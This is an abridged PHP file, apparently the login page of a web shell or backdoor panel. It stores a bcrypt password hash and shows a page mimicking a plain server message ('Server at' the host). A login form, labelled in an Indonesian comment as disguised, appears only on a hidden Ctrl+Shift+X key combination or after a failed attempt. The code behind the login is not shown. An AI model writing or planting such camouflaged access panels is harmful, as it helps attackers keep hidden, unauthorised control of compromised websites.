...
define('AUTH_PASS_HASH', '$2a$12$UFiPtYIrhS4nUqR7vptYMOjklnjCZhiyRu4xhttEBb9RNFy5J5ixS');
...
function render_login($err=''){
    ...
    <head>
        ...
        <style>
            ...
            .auth-box {
                ...
                border-radius: 4px;
                background: #f9f9f9;
                display: <?php echo empty($err) ? 'none' : 'block'; ?>;
            }
            .auth-box.force-show {
                display: block;
            }
        ...
        <script>
            ...
            document.addEventListener('keydown', function(e) {
                if (e.ctrlKey && e.shiftKey && e.key === 'X') {
                    ...
                    if (box) box.classList.add('force-show');
                }
            });
        </script>
    </head>
    <body>
        <div class="container">
            ...
            <!-- Form Login Disamarkan -->
            <div class="auth-box <?php echo !empty($err) ? 'force-show' : ''; ?>">
                <?php if($err): ?>
                    <div class="error-msg"><?php echo h($err); ?></div>
                <?php endif; ?>
            ...
            <div class="server-signature">
                Server at <?php echo h($_SERVER['HTTP_HOST'] ?? 'localhost'); ?>
            </div>
        </div>
    </body>
    </html>
